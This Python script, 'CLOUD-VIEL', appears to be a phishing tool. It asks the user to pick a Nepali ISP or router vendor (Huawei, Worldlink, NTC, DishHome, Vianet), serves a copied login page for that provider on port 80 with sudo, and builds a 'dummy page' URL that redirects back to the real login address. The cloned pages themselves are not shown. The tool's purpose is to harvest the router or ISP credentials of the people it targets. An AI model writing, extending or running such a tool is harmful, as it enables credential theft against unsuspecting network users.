import os
import http.server
import socket
import webbrowser
print('''
     CLOUD-VIEL
   =================
   (c)Devs d`e Nepal
   ~~~~~~~~~~~~~~~~~
   Dev. Gautam Kumar
   ~~~~~~~~~~~~~~~~~
''')
# get target type
target_type= input("Select ISP :-\n1. HUAWEI\n2.WORLDLINK\n3.Nepal Telecom\n4.DishHome\n5.Vianet\nEnter the selction: ")
target_type = int(target_type)-1
product_name = input("Product Name (Optional): ")
targets = ["HUAWEI","WORLDLINK","NTC","DISHHOME","VIANET"]
original_address = input("URL or DNS address of the login page: ")
# specify the directory you want to serve
print(os.getcwd())
directory = os.getcwd() +'/login-pages/'+ targets[target_type]
# change to the directory
os.chdir(directory)
## getting the hostname by socket.gethostname() method
hostname = socket.gethostname()
## getting the IP address using socket.gethostbyname() method
ip_address = socket.gethostbyname(hostname)
## printing the hostname and ip_address
# print(f"Hostname: {hostname}")
print(f"IP Address: {ip_address}")
dummy_page_location = "http://"+ip_address+"?product_name="+product_name+"&return_to="+original_address
print("Dummy page URL:"+dummy_page_location)
webbrowser.open(dummy_page_location)
print("Starting the server...")
# start the server
os.system("sudo python3 -m http.server 80")